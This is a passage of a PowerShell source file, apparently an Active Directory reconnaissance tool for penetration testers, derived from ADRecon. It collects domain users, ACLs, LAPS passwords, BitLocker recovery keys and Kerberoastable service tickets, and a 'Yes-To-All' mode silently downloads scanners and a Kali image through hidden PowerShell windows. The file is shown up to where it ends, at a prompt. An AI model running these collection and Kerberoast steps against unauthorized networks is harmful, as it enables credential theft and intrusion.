        [Parameter(Mandatory = $false)]
        [int] $PassMaxAge = 30,

        [Parameter(Mandatory = $false)]
        [int] $PageSize = 200,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10,

        [Parameter(Mandatory = $false)]
        [bool] $UseAltCreds = $false
    )

    [string] $ADReconVersion = "v1.1"
    Write-Host "Active Directory Recon... " -ForegroundColor Cyan
    Write-Host "You'll find results within the Report folder, both in .HTML and .csv format" -ForegroundColor Green;

    If ($GenExcel)
    {
        If (!(Test-Path $GenExcel))
        {
            Write-Output "[Outvoke-ADRecon] Invalid Path ... Exiting"
            Return $null
        }
        Export-ADRExcel -ExcelPath $GenExcel
        Return $null
    }


    $SaveVerbosePreference = $script:VerbosePreference
    $script:VerbosePreference = 'SilentlyContinue'
    Try
    {
        If ($PSVersionTable.PSVersion.Major -ne 2)
        {
            $computer = Get-CimInstance -ClassName Win32_ComputerSystem
            $computerdomainrole = ($computer).DomainRole
        }
        Else
        {
            $computer = Get-WMIObject win32_computersystem
            $computerdomainrole = ($computer).DomainRole
        }
    }
    Catch
    {
        Write-Output "[Outvoke-ADRecon] $($_.Exception.Message)"
    }
    If ($SaveVerbosePreference)
    {
        $script:VerbosePreference = $SaveVerbosePreference
        Remove-Variable SaveVerbosePreference
    }

    switch ($computerdomainrole)
    {
        0
        {
            [string] $computerrole = "Standalone Workstation"
            $Env:ADPS_LoadDefaultDrive = 0
            $UseAltCreds = $true
        }
        1 { [string] $computerrole = "Member Workstation" }
        2
        {
            [string] $computerrole = "Standalone Server"
            $UseAltCreds = $true
            $Env:ADPS_LoadDefaultDrive = 0
        }
        3 { [string] $computerrole = "Member Server" }
        4 { [string] $computerrole = "Backup Domain Controller" }
        5 { [string] $computerrole = "Primary Domain Controller" }
        default { Write-Output "Computer Role could not be identified." }
    }

    $RanonComputer = "$($computer.domain)\$([Environment]::MachineName) - $($computerrole)"
    Remove-Variable computer
    Remove-Variable computerdomainrole
    Remove-Variable computerrole


    If (($DomainController -ne "") -or ($Credential -ne [Management.Automation.PSCredential]::Empty))
    {

        If (($Protocol -eq 'ADWS') -and (-Not $UseAltCreds))
        {
            $Env:ADPS_LoadDefaultDrive = 0
        }
        $UseAltCreds = $true
    }


    If ($Protocol -eq 'ADWS')
    {
        Try
        {

            $SaveVerbosePreference = $script:VerbosePreference;
            $script:VerbosePreference = 'SilentlyContinue';
            Import-Module ActiveDirectory -WarningAction Stop -ErrorAction Stop | Out-Null
            If ($SaveVerbosePreference)
            {
                $script:VerbosePreference = $SaveVerbosePreference
                Remove-Variable SaveVerbosePreference
            }
        }
        Catch
        {
            Write-Warning "[Outvoke-ADRecon] Error importing ActiveDirectory Module from RSAT (Remote Server Administration Tools) ... Continuing with LDAP"
            $Protocol = 'LDAP'
            If ($SaveVerbosePreference)
            {
                $script:VerbosePreference = $SaveVerbosePreference
                Remove-Variable SaveVerbosePreference
            }
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
    }



    $SaveDebugPreference = $script:DebugPreference
    $script:DebugPreference = 'SilentlyContinue'
    Try
    {
        $Advapi32 = Add-Type -MemberDefinition $Advapi32Def -Name "Advapi32" -Namespace ADRecon -PassThru
        $Kernel32 = Add-Type -MemberDefinition $Kernel32Def -Name "Kernel32" -Namespace ADRecon -PassThru
        Add-Type -TypeDefinition $PingCastleSMBScannerSource
        $CLR = ([System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion)[1]
        If ($Protocol -eq 'ADWS')
        {
            If ($CLR -eq "4")
            {
                Add-Type -TypeDefinition $ADWSSource -ReferencedAssemblies ([System.String[]]@(([System.Reflection.Assembly]::LoadWithPartialName("Microsoft.ActiveDirectory.Management")).Location,([System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices")).Location))
            }
            Else
            {
                Add-Type -TypeDefinition $ADWSSource -ReferencedAssemblies ([System.String[]]@(([System.Reflection.Assembly]::LoadWithPartialName("Microsoft.ActiveDirectory.Management")).Location,([System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices")).Location)) -Language CSharpVersion3
            }
        }

        If ($Protocol -eq 'LDAP')
        {
            If ($CLR -eq "4")
            {
                Add-Type -TypeDefinition $LDAPSource -ReferencedAssemblies ([System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices")).Location
            }
            Else
            {
                Add-Type -TypeDefinition $LDAPSource -ReferencedAssemblies ([System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices")).Location -Language CSharpVersion3
            }
        }
    }
    Catch
    {
        Write-Output "[Outvoke-ADRecon] $($_.Exception.Message)"
        Return $null
    }
    If ($SaveDebugPreference)
    {
        $script:DebugPreference = $SaveDebugPreference
        Remove-Variable SaveDebugPreference
    }



    If (($Protocol -eq 'LDAP') -and ($UseAltCreds) -and ($DomainController -eq "") -and ($Credential -eq [Management.Automation.PSCredential]::Empty))
    {
        Try
        {
            $objDomain = [ADSI]""
            If(!($objDomain.name))
            {
                Write-Verbose "[Outvoke-ADRecon] RUNAS Check, LDAP bind Unsuccessful"
            }
            $UseAltCreds = $false
            $objDomain.Dispose()
        }
        Catch
        {
            $UseAltCreds = $true
        }
    }

    If ($UseAltCreds -and (($DomainController -eq "") -or ($Credential -eq [Management.Automation.PSCredential]::Empty)))
    {

        If (($DomainController -ne "") -and ($Credential -eq [Management.Automation.PSCredential]::Empty))
        {
            Try
            {
                $Credential = Get-Credential
            }
            Catch
            {
                Write-Output "[Outvoke-ADRecon] $($_.Exception.Message)"
                Return $null
            }
        }
        Else
        {
            Write-Output "Run Get-Help .\ADRecon.ps1 -Examples for additional information."
            Write-Output "[Outvoke-ADRecon] Use the -DomainController and -Credential parameter."`n
            Return $null
        }
    }

    Write-Output "[*] Running on $RanonComputer"

    Switch ($Collect)
    {
        'Forest' { $ADRForest = $true }
        'Domain' {$ADRDomain = $true }
        'Trusts' { $ADRTrust = $true }
        'Sites' { $ADRSite = $true }
        'Subnets' { $ADRSubnet = $true }
        'PasswordPolicy' { $ADRPasswordPolicy = $true }
        'FineGrainedPasswordPolicy' { $ADRFineGrainedPasswordPolicy = $true }
        'DomainControllers' { $ADRDomainControllers = $true }
        'Users' { $ADRUsers = $true }
        'UserSPNs' { $ADRUserSPNs = $true }
        'PasswordAttributes' { $ADRPasswordAttributes = $true }
        'Groups' { $ADRGroups = $true }
        'GroupMembers' { $ADRGroupMembers = $true }
        'OUs' { $ADROUs = $true }
        'GPOs' { $ADRGPOs = $true }
        'gPLinks' { $ADRgPLinks = $true }
        'DNSZones' { $ADRDNSZones = $true }
        'Printers' { $ADRPrinters = $true }
        'Computers' { $ADRComputers = $true }
        'ComputerSPNs' { $ADRComputerSPNs = $true }
        'LAPS' { $ADRLAPS = $true }
        'BitLocker' { $ADRBitLocker = $true }
        'ACLs' { $ADRACLs = $true }
        'GPOReport'
        {
            $ADRGPOReport = $true
            $ADRCreate = $true
        }
        'Kerberoast' { $ADRKerberoast = $true }
        'DomainAccountsusedforServiceLogon' { $ADRDomainAccountsusedforServiceLogon = $true }
        'Default'
        {
            $ADRForest = $true
            $ADRDomain = $true
            $ADRTrust = $true
            $ADRSite = $true
            $ADRSubnet = $true
            $ADRPasswordPolicy = $true
            $ADRFineGrainedPasswordPolicy = $true
            $ADRDomainControllers = $true
            $ADRUsers = $true
            $ADRUserSPNs = $true
            $ADRPasswordAttributes = $true
            $ADRGroups = $true
            $ADRGroupMembers = $true
            $ADROUs = $true
            $ADRGPOs = $true
            $ADRgPLinks = $true
            $ADRDNSZones = $true
            $ADRPrinters = $true
            $ADRComputers = $true
            $ADRComputerSPNs = $true
            $ADRLAPS = $true
            $ADRBitLocker = $true
            $ADRACLs = $true
            $ADRGPOReport = $true


            If ($OutputType -eq "Default")
            {
                [array] $OutputType = "CSV","Excel"
            }
        }
    }

    Switch ($OutputType)
    {
        'STDOUT' { $ADRSTDOUT = $true }
        'CSV'
        {
            $ADRCSV = $true
            $ADRCreate = $true
        }
        'XML'
        {
            $ADRXML = $true
            $ADRCreate = $true
        }
        'JSON'
        {
            $ADRJSON = $true
            $ADRCreate = $true
        }
        'HTML'
        {
            $ADRHTML = $true
            $ADRCreate = $true
        }
        'Excel'
        {
            $ADRExcel = $true
            $ADRCreate = $true
        }
        'All'
        {

            $ADRCSV = $true
            $ADRXML = $true
            $ADRJSON = $true
            $ADRHTML = $true
            $ADRExcel = $true
            $ADRCreate = $true
            [array] $OutputType = "CSV","XML","JSON","HTML","Excel"
        }
        'Default'
        {
            [array] $OutputType = "STDOUT"
            $ADRSTDOUT = $true
        }
    }

    If ( ($ADRExcel) -and (-Not $ADRCSV) )
    {
        $ADRCSV = $true
        [array] $OutputType += "CSV"
    }

    $returndir = Get-Location
    $date = Get-Date


    If ( ($ADROutputDir) -and ($ADRCreate) )
    {
        If (!(Test-Path $ADROutputDir))
        {
            New-Item $ADROutputDir -type directory | Out-Null
            If (!(Test-Path $ADROutputDir))
            {
                Write-Output "[Outvoke-ADRecon] Error, invalid OutputDir Path ... Exiting"
                Return $null
            }
        }
        $ADROutputDir = $((Convert-Path $ADROutputDir).TrimEnd("\"))
        Write-Verbose "[*] Output Directory: $ADROutputDir"
    }
    ElseIf ($ADRCreate)
    {
        $ADROutputDir =  -join($returndir,'\','Recon_Report')
        New-Item $ADROutputDir -type directory | Out-Null
        If (!(Test-Path $ADROutputDir))
        {
            Write-Output "[Outvoke-ADRecon] Error, could not create output directory"
            Return $null
        }
        $ADROutputDir = $((Convert-Path $ADROutputDir).TrimEnd("\"))
        Remove-Variable ADRCreate
    }
    Else
    {
        $ADROutputDir = $returndir
    }

    If ($ADRCSV)
    {
        $CSVPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\','CSV-Files')
        New-Item $CSVPath -type directory | Out-Null
        If (!(Test-Path $CSVPath))
        {
            Write-Output "[Outvoke-ADRecon] Error, could not create output directory"
            Return $null
        }
        Remove-Variable ADRCSV
    }

    If ($ADRXML)
    {
        $XMLPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\','XML-Files')
        New-Item $XMLPath -type directory | Out-Null
        If (!(Test-Path $XMLPath))
        {
            Write-Output "[Outvoke-ADRecon] Error, could not create output directory"
            Return $null
        }
        Remove-Variable ADRXML
    }

    If ($ADRJSON)
    {
        $JSONPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\','JSON-Files')
        New-Item $JSONPath -type directory | Out-Null
        If (!(Test-Path $JSONPath))
        {
            Write-Output "[Outvoke-ADRecon] Error, could not create output directory"
            Return $null
        }
        Remove-Variable ADRJSON
    }

    If ($ADRHTML)
    {
        $HTMLPath = [System.IO.DirectoryInfo] -join($ADROutputDir)

        If (!(Test-Path $HTMLPath))
        {
            Write-Output "[Outvoke-ADRecon] Error, could not create output directory"
            Return $null
        }
        Remove-Variable ADRHTML
    }


    If ($UseAltCreds -and ($Protocol -eq 'ADWS'))
    {
        If (!(Test-Path ADR:))
        {
            Try
            {
                New-PSDrive -PSProvider ActiveDirectory -Name ADR -Root "" -Server $DomainController -Credential $Credential -ErrorAction Stop | Out-Null
            }
            Catch
            {
                Write-Output "[Outvoke-ADRecon] $($_.Exception.Message)"
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
        }
        Else
        {
            Remove-PSDrive ADR
            Try
            {
                New-PSDrive -PSProvider ActiveDirectory -Name ADR -Root "" -Server $DomainController -Credential $Credential -ErrorAction Stop | Out-Null
            }
            Catch
            {
                Write-Output "[Outvoke-ADRecon] $($_.Exception.Message)"
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
        }
        Set-Location ADR:
        Write-Debug "ADR PSDrive Created"
    }

    If ($Protocol -eq 'LDAP')
    {
        If ($UseAltCreds)
        {
            Try
            {
                $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objDomainRootDSE = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/RootDSE", $Credential.UserName,$Credential.GetNetworkCredential().Password
            }
            Catch
            {
                Write-Output "[Outvoke-ADRecon] $($_.Exception.Message)"
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
            If(!($objDomain.name))
            {
                Write-Output "[Outvoke-ADRecon] LDAP bind Unsuccessful"
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
            Else
            {
                Write-Output "[*] LDAP bind Successful"
            }
        }
        Else
        {
            $objDomain = [ADSI]""
            $objDomainRootDSE = ([ADSI] "LDAP://RootDSE")
            If(!($objDomain.name))
            {
                Write-Output "[Outvoke-ADRecon] LDAP bind Unsuccessful"
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
        }
        Write-Debug "LDAP Bing Successful"
    }

    Write-Output "[*] Commencing - $date"
    If ($ADRDomain)
    {
        Write-Output "[-] Domain"
        $ADRObject = Get-ADRDomain -Protocol $Protocol -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Domain"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRDomain
    }
    If ($ADRForest)
    {
        Write-Output "[-] Forest"
        $ADRObject = Get-ADRForest -Protocol $Protocol -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Forest"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRForest
    }
    If ($ADRTrust)
    {
        Write-Output "[-] Trusts"
        $ADRObject = Get-ADRTrust -Protocol $Protocol -objDomain $objDomain
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Trusts"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRTrust
    }
    If ($ADRSite)
    {
        Write-Output "[-] Sites"
        $ADRObject = Get-ADRSite -Protocol $Protocol -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Sites"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRSite
    }
    If ($ADRSubnet)
    {
        Write-Output "[-] Subnets"
        $ADRObject = Get-ADRSubnet -Protocol $Protocol -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Subnets"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRSubnet
    }
    If ($ADRPasswordPolicy)
    {
        Write-Output "[-] Default Password Policy"
        $ADRObject = Get-ADRDefaultPasswordPolicy -Protocol $Protocol -objDomain $objDomain
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "DefaultPasswordPolicy"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRPasswordPolicy
    }
    If ($ADRFineGrainedPasswordPolicy)
    {
        Write-Output "[-] Fine Grained Password Policy - May need a Privileged Account"
        $ADRObject = Get-ADRFineGrainedPasswordPolicy -Protocol $Protocol -objDomain $objDomain
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "FineGrainedPasswordPolicy"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRFineGrainedPasswordPolicy
    }
    If ($ADRDomainControllers)
    {
        Write-Output "[-] Domain Controllers"
        $ADRObject = Get-ADRDomainController -Protocol $Protocol -objDomain $objDomain -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "DomainControllers"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRDomainControllers
    }
    If ($ADRUsers)
    {
        Write-Output "[-] Users - May take some time"
        $ADRObject = Get-ADRUser -Protocol $Protocol -date $date -objDomain $objDomain -DormantTimeSpan $DormantTimeSpan -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Users"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRUsers
    }
    If ($ADRUserSPNs)
    {
        Write-Output "[-] User SPNs"
        $ADRObject = Get-ADRUserSPN -Protocol $Protocol -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "UserSPNs"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRUserSPNs
    }
    If ($ADRPasswordAttributes)
    {
        Write-Output "[-] PasswordAttributes - Experimental"
        $ADRObject = Get-ADRPasswordAttributes -Protocol $Protocol -objDomain $objDomain -PageSize $PageSize
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "PasswordAttributes"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRPasswordAttributes
    }
    If ($ADRGroups)
    {
        Write-Output "[-] Groups - May take some time"
        $ADRObject = Get-ADRGroup -Protocol $Protocol -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Groups"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRGroups
    }
    If ($ADRGroupMembers)
    {
        Write-Output "[-] Group Memberships - May take some time"

        $ADRObject = Get-ADRGroupMember -Protocol $Protocol -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "GroupMembers"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRGroupMembers
    }
    If ($ADROUs)
    {
        Write-Output "[-] OrganizationalUnits (OUs)"
        $ADRObject = Get-ADROU -Protocol $Protocol -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "OUs"
            Remove-Variable ADRObject
        }
        Remove-Variable ADROUs
    }
    If ($ADRGPOs)
    {
        Write-Output "[-] GPOs"
        $ADRObject = Get-ADRGPO -Protocol $Protocol -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "GPOs"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRGPOs
    }
    If ($ADRgPLinks)
    {
        Write-Output "[-] gPLinks - Scope of Management (SOM)"
        $ADRObject = Get-ADRgPLink -Protocol $Protocol -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "gPLinks"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRgPLinks
    }
    If ($ADRDNSZones)
    {
        Write-Output "[-] DNS Zones and Records"
        Get-ADRDNSZone -Protocol $Protocol -ADROutputDir $ADROutputDir -objDomain $objDomain -DomainController $DomainController -Credential $Credential -PageSize $PageSize -OutputType $OutputType
        Remove-Variable ADRDNSZones
    }
    If ($ADRPrinters)
    {
        Write-Output "[-] Printers"
        $ADRObject = Get-ADRPrinter -Protocol $Protocol -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Printers"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRPrinters
    }
    If ($ADRComputers)
    {
        Write-Output "[-] Computers - May take some time"
        $ADRObject = Get-ADRComputer -Protocol $Protocol -date $date -objDomain $objDomain -DormantTimeSpan $DormantTimeSpan -PassMaxAge $PassMaxAge -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Computers"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRComputers
    }
    If ($ADRComputerSPNs)
    {
        Write-Output "[-] Computer SPNs"
        $ADRObject = Get-ADRComputerSPN -Protocol $Protocol -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "ComputerSPNs"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRComputerSPNs
    }
    If ($ADRLAPS)
    {
        Write-Output "[-] LAPS - Needs Privileged Account"
        $ADRObject = Get-ADRLAPSCheck -Protocol $Protocol -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "LAPS"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRLAPS
    }
    If ($ADRBitLocker)
    {
        Write-Output "[-] BitLocker Recovery Keys - Needs Privileged Account"
        $ADRObject = Get-ADRBitLocker -Protocol $Protocol -objDomain $objDomain -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "BitLockerRecoveryKeys"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRBitLocker
    }
    If ($ADRACLs)
    {
        Write-Output "[-] ACLs - May take some time"
        $ADRObject = Get-ADRACL -Protocol $Protocol -objDomain $objDomain -DomainController $DomainController -Credential $Credential -PageSize $PageSize -Threads $Threads
        Remove-Variable ADRACLs
    }
    If ($ADRGPOReport)
    {
        Write-Output "[-] GPOReport - May take some time"
        Get-ADRGPOReport -Protocol $Protocol -UseAltCreds $UseAltCreds -ADROutputDir $ADROutputDir
        Remove-Variable ADRGPOReport
    }
    If ($ADRKerberoast)
    {
        Write-Output "[-] Kerberoast"
        $ADRObject = Get-ADRKerberoast -Protocol $Protocol -objDomain $objDomain -Credential $Credential -PageSize $PageSize
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Kerberoast"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRKerberoast
    }
    If ($ADRDomainAccountsusedforServiceLogon)
    {
        Write-Output "[-] Domain Accounts used for Service Logon - Needs Privileged Account"
        $ADRObject = Get-ADRDomainAccountsusedforServiceLogon -Protocol $Protocol -objDomain $objDomain -Credential $Credential -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "DomainAccountsusedforServiceLogon"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRDomainAccountsusedforServiceLogon
    }

    $TotalTime = "{0:N2}" -f ((Get-DateDiff -Date1 (Get-Date) -Date2 $date).TotalMinutes)

    $AboutThisScan = Get-ADRAbout -Protocol $Protocol -date $date -ADReconVersion $ADReconVersion -Credential $Credential -RanonComputer $RanonComputer -TotalTime $TotalTime

    If ( ($OutputType -Contains "CSV") -or ($OutputType -Contains "XML") -or ($OutputType -Contains "JSON") -or ($OutputType -Contains "HTML") )
    {
        If ($AboutThisScan)
        {
            Export-ADR -ADRObj $AboutThisScan -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "AboutThisScan"
        }
        Write-Output "[*] Total Execution Time (mins): $($TotalTime)"
        Write-Output "[*] Output Directory: $ADROutputDir"
        $ADRSTDOUT = $false
    }

    Switch ($OutputType)
    {
        'STDOUT'
        {
            If ($ADRSTDOUT)
            {
                Write-Output "[*] Total Execution Time (mins): $($TotalTime)"
            }
        }
        'HTML'
        {
            Export-ADR -ADRObj $(New-Object PSObject) -ADROutputDir $ADROutputDir -OutputType $([array] "HTML") -ADRModuleName "Index"
        }
        'EXCEL'
        {
            Export-ADRExcel $ADROutputDir
        }
    }
    Remove-Variable TotalTime
    Remove-Variable AboutThisScan
    Set-Location $returndir
    Remove-Variable returndir

    If (($Protocol -eq 'ADWS') -and $UseAltCreds)
    {
        Remove-PSDrive ADR
    }

    If ($Protocol -eq 'LDAP')
    {
        $objDomain.Dispose()
        $objDomainRootDSE.Dispose()
    }

    If ($ADROutputDir)
    {
        Remove-EmptyADROutputDir $ADROutputDir $OutputType
    }

    Remove-Variable ADReconVersion
    Remove-Variable RanonComputer
}

If ($Log)
{
    Start-Transcript -Path "$(Get-Location)\ADRecon-Console-Log.txt"
}

$jcurrentdomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }

if ($jcurrentdomain -eq "WORKGROUP")
{
    Write-Host "It looks like your machine is not domain joined" -ForegroundColor Red;
    Write-Host "This tool will serve no purpose" -ForegroundColor Yellow;
    Write-Host "Arrivederci.." -ForegroundColor Yellow;
    break
}

elseif($jYesToAll -eq "All"){
	Write-Host "    _                                  " -ForegroundColor Red;
    Write-Host "   (_) _ __   ___   ___   ___   _ __   " -ForegroundColor Red;
    Write-Host "   | || '__| / _ \ / __| / _ \ | '_ \  " -ForegroundColor Red;
    Write-Host "   | || |   |  __/| (__ | (_) || | | | " -ForegroundColor Red;
    Write-Host "  _/ ||_|    \___| \___| \___/ |_| |_| " -ForegroundColor Red;
    Write-Host " |__/                                  " -ForegroundColor Red;
    Write-Host "                                       " -ForegroundColor Red;
    Write-Host "You are running in " -ForegroundColor Red -NoNewline; Write-Host "Yes-To-All" -ForegroundColor Yellow -NoNewline; Write-Host " mode.." -ForegroundColor Red;
	Write-Host "Please be caruful as you may easily go out of scope" -ForegroundColor Yellow;
	Write-Host "Current domain is: " -ForegroundColor Cyan -NoNewline; Write-Host "$jcurrentdomain" -ForegroundColor Green
	Write-Host "Recon will be done for everything, and all domains.." -ForegroundColor Red;
	Write-Host "URL File attack/cleaning will be skipped in this mode" -ForegroundColor Yellow;
	Write-Host "You have 10 seconds to kill this script.." -ForegroundColor Cyan;
    Start-Sleep -Seconds 10
	if(Test-Path -Path $pwd\Tools\){}
	else{New-Item -Path $pwd\Tools\ -ItemType Directory | Out-Null}
	if(Test-Path -Path $pwd\Tools\Nessus.exe){}
	else{start powershell -WindowStyle Hidden {Invoke-WebRequest -Uri "https://www.tenable.com/downloads/api/v1/public/pages/nessus/downloads/17756/download?i_agree_to_tenable_license_agreement=true" -OutFile "$pwd\Tools\Nessus.exe"}}
	if(Test-Path -Path $pwd\Tools\WinShareEnum.exe){}
	else{start powershell -WindowStyle Hidden {Invoke-WebRequest -Uri "https://github.com/nccgroup/WinShareEnum/raw/master/Info/WinShareEnum.exe" -OutFile "$pwd\Tools\WinShareEnum.exe"}}
	if(Test-Path -Path $pwd\Tools\Advanced_IP_Scanner.exe){}
	else{start powershell -WindowStyle Hidden {Invoke-WebRequest -Uri "https://download.advanced-ip-scanner.com/download/files/Advanced_IP_Scanner_2.5.4594.1.exe" -OutFile "$pwd\Tools\Advanced_IP_Scanner.exe"}}
	if(Test-Path -Path $pwd\Tools\VirtualBox.exe){}
	else{start powershell -WindowStyle Hidden {Invoke-WebRequest -Uri "https://download.virtualbox.org/virtualbox/7.0.2/VirtualBox-7.0.2-154219-Win.exe" -OutFile "$pwd\Tools\VirtualBox.exe"}}
	if(Test-Path -Path $pwd\Tools\kali.7z){}
	else{start powershell -WindowStyle Hidden {Invoke-WebRequest -Uri "https://kali.download/virtual-images/kali-2022.3/kali-linux-2022.3-virtualbox-amd64.7z" -OutFile "$pwd\Tools\kali.7z"}}
	$jdownloadtools = ""
	$jdownloadkali = ""
    $jenum = ""
	$jblood = ""
    $jPingCastle = ""
    $jshareask = ""
	$jpingquest = ""
    $jwritejwrite = ""
    $jfileattack = "n"
    $jfileclean = "n"
	$jkerbask = ""
    $jdomain = ""
	$jtemplates = ""
	$jvulnGPO = ""
    $jldap = ""
    $jexploitable = ""
    $jgpo = ""
    $jsysvol = ""
	$jvulnGPO = ""
	echo ""
    Write-Host "OK... Let's start.." -ForegroundColor Green;
	echo ""
	echo ""
	$jYesToAll = ""
	
}

else{
    Write-Host "    _                                  " -ForegroundColor Red;
    Write-Host "   (_) _ __   ___   ___   ___   _ __   " -ForegroundColor Red;
    Write-Host "   | || '__| / _ \ / __| / _ \ | '_ \  " -ForegroundColor Red;
    Write-Host "   | || |   |  __/| (__ | (_) || | | | " -ForegroundColor Red;
    Write-Host "  _/ ||_|    \___| \___| \___/ |_| |_| " -ForegroundColor Red;
    Write-Host " |__/                                  " -ForegroundColor Red;
    Write-Host "                                       " -ForegroundColor Red;
    Write-Host "Before we start.. let's make sure we stay in scope.." -ForegroundColor Green;
    Write-Host "Current domain is: " -ForegroundColor Cyan -NoNewline; Write-Host "$jcurrentdomain" -ForegroundColor Yellow
	Write-Host "Do you want to download " -NoNewline
	Write-Host "Nessus" -ForegroundColor Yellow -NoNewline
	Write-Host " ? Leave blank for YES: " -NoNewline
	$jdownloadNessus = Read-Host
